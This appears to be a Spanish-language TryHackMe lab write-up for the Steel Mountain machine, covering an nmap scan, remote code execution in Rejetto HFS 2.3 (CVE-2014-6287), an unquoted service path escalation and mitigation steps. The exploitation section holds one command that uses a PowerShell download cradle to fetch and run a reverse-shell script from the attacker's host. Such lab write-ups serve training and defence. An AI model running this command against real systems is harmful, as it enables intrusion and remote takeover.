<div align="center">

# 🛡️ INFORME TÉCNICO: STEELMOUNTAIN
**TryHackMe — Ruta Jr Penetration Tester**

![Fácil](https://img.shields.io/badge/DIFICULTAD-FÁCIL-red?style=for-the-badge)
![Windows](https://img.shields.io/badge/SO-WINDOWS-blue?style=for-the-badge)
![CVE](https://img.shields.io/badge/CVE-2014--6287-darkred?style=for-the-badge)

</div>

---

### 📋 Metadatos del Objetivo

| Parámetro | Detalle | Parámetro | Detalle |
| :--- | :--- | :--- | :--- |
| **IP Objetivo** | `10.10.124.55` | **Auditor** | Daniel Espinal |
| **Acceso Inicial** | `bill` (Estándar) | **Elevación Final** | `NT AUTHORITY\SYSTEM` |

---

## 1. Fase de Reconocimiento y Escaneo

Se ejecutó un escaneo inicial para identificar servicios expuestos y versiones activas en el host objetivo:

```text
nmap -sC -sV -p- -T4 --min-rate 1000 10.10.124.55 -oN scans/initial_nmap.txt
```

### Puertos y Servicios Detectados

| Puerto | Servicio | Versión Identificada | Criticidad |
| :---: | :--- | :--- | :---: |
| `80/tcp` | HTTP | Microsoft IIS httpd 8.5 | Baja |
| `8080/tcp` | HTTP | HttpFileServer httpd 2.3 (Rejetto) | **Crítica** |
| `3389/tcp` | ms-wbt-server | Microsoft Terminal Services (RDP) | Media |

> [!NOTE]
> **Evidencia Nmap:**  
> *(Arrastra y suelta tu captura de pantalla aquí)*

---

## 2. Explotación (Acceso Inicial)

El servicio web detectado en el puerto `8080` corresponde a **Rejetto HTTP File Server 2.3**, vulnerable a ejecución remota de comandos (**CVE-2014-6287**) debido al filtrado indebido de caracteres nulos (`%00`).

> [!WARNING]
> **Vector Identificado:** El servicio permite inyección de parámetros a través de peticiones HTTP para invocar procesos en el sistema anfitrión.

```text
python3 exploit.py 10.10.124.55 8080 "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://10.9.x.x/shell.ps1')"
```

> [!NOTE]
> **Evidencia Shell Reversa:**  
> *(Arrastra y suelta tu captura de la sesión de terminal aquí)*

---

## 3. Escalada de Privilegios

Tras obtener acceso con la cuenta de servicio o usuario estándar, se procedió a la enumeración interna de vectores locales:

* **Vector identificado:** Servicio con ruta sin entrecomillar (*Unquoted Service Path*) y permisos de escritura en la carpeta contenedora.
* **Impacto:** Permite la intercepción del ejecutable durante el arranque del servicio para ejecutar instrucciones en el contexto de máxima autoridad.

> [!NOTE]
> **Evidencia Escalada:**  
> *(Arrastra y suelta aquí la captura del comando whoami con privilegios elevados)*

---

## 4. Medidas de Mitigación y Remediación

> [!TIP]
> 1. **Parcheo de software:** Desinstalar o actualizar Rejetto HFS v2.3 a una versión segura o sustituirlo por una alternativa soportada.
> 2. **Hardening de servicios:** Entrecomillar todas las rutas de ejecutables de servicios en el Registro de Windows (`HKLM\SYSTEM\CurrentControlSet\Services`).
> 3. **Principio de menor privilegio:** Restringir permisos de escritura para cuentas no privilegiadas en directorios de sistema y carpetas de aplicaciones.